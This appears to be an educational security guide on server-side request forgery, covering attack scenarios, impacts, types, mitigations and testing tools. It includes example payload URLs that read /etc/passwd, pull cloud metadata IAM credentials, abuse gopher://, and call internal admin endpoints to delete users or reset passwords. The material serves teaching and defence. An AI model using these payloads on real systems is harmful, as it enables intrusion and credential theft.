+Most common reason is there are certain applications which are hidden inside an internal network, an attacker doesn't have access to it or if app is behind a firewall you'll not be able to find the origin IP of the server in that case also you can use ssrf.
+
+SSRF is a web vulnerability that allows an attacker to send HTTP requests from the server to internal or external resources by manipulating user-supplied input to target domains or resources.
+
+Fetching internal resources:
+------------------------------
+
+Attackers exploit SSRf to access sensitive internal URL's like /admin, /debug, /config etc to access unauthorised information.
+
+Example: Suppose in a web application there is an instance where user supplied input url is used to fetch data from a given website. An attacker could manipulate the input url and make the server to fetch some sensitive internal URLs, such as http://localhost/admin which may reveal sensitive information.
+
+Accessing Backend API:
+----------------------
+
+Attackers force the server to interact with the internal APIs, potentially exposing sensitive data or performing unauthorised actions.
+
+example: an app might be interacting with a image processing API. An attacker can manipulate the URL to target an internal API which might provide access to critical backend databases or systems.
+
+Port scanning of internal servers:
+-------------------------------------
+
+Attackers use ssrf to scan internal IP  addresses and identify active open ports and services, adding in further attacks.
+
+Example: The web application allows users to enter a URL to fetch a webpage's title for display. An attacker manipulates the URL to access an internal IP address and port (e.g., http://192.168.0.1:22) to check for open SSH port (22) and identify active services.
+
+Bypassing firewall restrictions:
+---------------------------------
+
+Attackers use ssrf to access the resources that are blocked by firewall thereby evading firewall security controls.
+
+Bypassing Firewall Restrictions: Attackers use SSRF to access resources that are blocked by the firewall, evading security controls.
+
+Example: An attacker can exploit SSRF to bypass firewall restrictions by making the server request an external URL that is blocked for direct access from the internet. Still, the server can access it due to internal network access.
+
+Impact of SSRF attacks
+------------------------
+
+unauthorised data access: 
+Attackers can read sensitive data from internal systems or databases accessible by the server, leading to potential data breaches.
+
+Service and System Compromise:
+SSRF can compromise backend services and internal systems, allowing attackers unauthorized control over critical components.
+
+Information Disclosure: 
+Attackers may leak sensitive information from internal resources or backend APIs, potentially harming the organization's reputation.
+
+Application and Server Misuse:
+SSRF can be leveraged to perform unauthorized actions on other web applications or servers, causing disruptions.
+
+SSRF attack vectors
+---------------------
+
+URL Parameter Manipulation: Attackers manipulate URL parameters to control the target of the SSRF request, directing it to a vulnerable resource.
+
+Example SSRF Payload:
+
+http://vulnerable-server.com/fetch?url=http://internal-server.com/confidential-data
+
+URI Redirection: Attackers use URL redirection to trick the server into making requests to unintended destinations, bypassing security controls.
+Example SSRF Payload: http://vulnerable-server.com/fetch?url=http://metadata-server/latest/meta-data/iam/security-credentials/admin-role
+
+DNS Rebinding: Attackers exploit DNS caching to make the server request a malicious domain after the initial request, leading to SSRF.
+Example SSRF Payload: http://vulnerable-server.com/fetch?url=http://attacker.com (where attacker.com resolves to internal-server.com)
+
+URL Shorteners and Redirects: Attackers use URL shorteners or redirects to hide the ultimate destination of the SSRF request, making detection challenging.
+Example SSRF Payload:
+
+http://vulnerable-server.com/fetch?url=http://short.link/malicious
+
+Protocol and Port Abuse: Attackers specify non-standard protocols or ports in SSRF requests to evade security measures.
+
+Example SSRF Payload:
+
+http://vulnerable-server.com/fetch?url=gopher://internal-server.com/confidential-data
+
+Real-World SSRF Examples
+------------------------
+
+Reading Local Files: Attackers use SSRF to access sensitive files on the server's local file system, such as configuration files containing credentials.
+Example SSRF Payload: http://vulnerable-server.com/fetch?url=file:///etc/passwd
+
+Accessing Metadata Endpoints: By exploiting SSRF, attackers can access metadata endpoints in cloud environments to gather sensitive information about the infrastructure.
+Example SSRF Payload: http://vulnerable-server.com/fetch?url=http://metadata-server/latest/meta-data/iam/security-credentials/admin-role
+
+Attacking Backend Services: Attackers exploit SSRF to send malicious requests to internal microservices or APIs, causing service disruptions or data leaks.
+Example SSRF Payload: http://vulnerable-server.com/fetch?url=http://internal-api-server.com/admin/deleteUser?userId=123
+
+Exploiting Insecure APIs: Attackers can use SSRF to abuse poorly secured external APIs on behalf of the server, leading to potential API misuse.
+Example SSRF Payload: http://vulnerable-server.com/fetch?url=http://insecure-api-server.com/changePassword?user=admin&newPassword=hacked123
+
+Types of SSRF
+-------------
+
+Blind SSRF: SSRF is without direct responses from the server, making it harder to detect, as attackers don't receive immediate feedback on the success of the request.
+
+Time-based SSRF: Attackers use delays in responses to determine if the SSRF request was successful or not, enabling them to extract information indirectly.
+
+Asynchronous SSRF: Attackers leverage asynchronous behaviour to execute SSRF attacks, making tracing and preventing such attacks more challenging.
+
+DNS SSRF: Attackers exploit DNS functionality to perform SSRF, using DNS resolution to access internal resources or bypass filters.
+
+SSRF Mitigation
+---------------
+
+Input Validation and Allowlisting: Validate and restrict user-supplied URLs to prevent SSRF attacks by allowing only trusted domains or IP ranges.
+
+Restricting Access to Trusted Domains: Configure network settings or firewalls to limit outbound requests to approved destinations, reducing SSRF exposure.
+
+URL Parsing and Sanitization: Use secure URL parsing libraries and sanitize input to prevent SSRF attacks by blocking malicious URLs.
+
+Firewall and Network Configurations: Implement strict firewall rules to prevent SSRF attacks from reaching internal resources, limiting the attack surface.
+
+Hardening Internal Services: Secure internal services to minimize the impact of potential SSRF attacks, ensuring access control and validation.
+
+Security Best Practices
+-------------------------
+
+Regular Security Audits: Conduct security audits and penetration testing to identify and address SSRF vulnerabilities proactively.
+
+Patch Management: Keep software and libraries up-to-date to avoid known SSRF-related security issues.
+
+Employee Training on SSRF: Educate developers and personnel about SSRF risks and prevention strategies to promote a security-aware culture.
+
+Secure Coding Guidelines: Please follow best practices for secure web application development to avoid SSRF vulnerabilities.
+
+SSRF Tools and Resources
+---------------------------
+
+Web Proxies and Debuggers: Tools like Burp Suite and OWASP ZAP aid in testing and identifying SSRF vulnerabilities during development.
+
+SSRF Testing Frameworks: Gopherus, SSRFmap, and Ground-Control provide automated testing capabilities to uncover SSRF vulnerabilities.
+
+Exploitation Tools: Ruler (For Exchange SSRF) and XXE Injection Frameworks offer tools to exploit SSRF vulnerabilities for testing.
+
+OWASP SSRF Cheat Sheet: A comprehensive resource from OWASP that guides preventing and mitigating SSRF attacks.
+
+Blogs and Research Papers: You can learn from SSRF-related blogs and research papers to understand the latest trends and defence strategies.
+
+Bug Bounty Platforms and Programs: Engage with bug bounty platforms to incentivize researchers to report SSRF vulnerabilities responsibly.
+
+
+
+
+
